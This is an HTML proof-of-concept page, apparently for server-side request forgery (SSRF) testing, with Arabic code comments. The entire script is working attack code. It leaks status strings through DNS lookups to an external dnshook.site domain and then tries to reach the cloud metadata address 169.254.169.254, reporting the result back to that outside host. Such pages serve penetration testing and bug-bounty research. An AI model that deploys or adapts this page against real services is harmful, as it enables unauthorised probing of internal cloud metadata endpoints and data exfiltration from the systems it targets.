<!DOCTYPE html>
<html>
<head>
    <title>SSRF PoC - DNS Exfil v3</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // نطاق DNSHook الجديد الخاص بك
        const DNS_HOOK_DOMAIN = "a5852858-9701-4e74-896b-ba98539cebed.dnshook.site";

        // دالة بسيطة لتسريب البيانات عبر DNS
        function exfiltrate(data) {
            // استبدال الأحرف غير الصالحة بنقاط
            let subdomain = data.replace(/[^a-zA-Z0-9-]/g, '.').substring(0, 60);
            // استخدام fetch لتجنب مشاكل حظر الصور
            fetch("http://" + subdomain + "." + DNS_HOOK_DOMAIN, { mode: 'no-cors' });
        }

        exfiltrate("Stage1-PoC-Loaded-in-Browser");

        setTimeout(() => {
            exfiltrate("Stage2-Attempting-Internal-Fetch");
            fetch('http://169.254.169.254/')
                .then(response => {
                    exfiltrate("Stage3-SUCCESS-Internal-Connection-OK");
                })
                .catch(error => {
                    exfiltrate("Stage4-FAILED-Internal-Connection-Blocked");
                });
        }, 7000);
    </script>
</body>
</html>
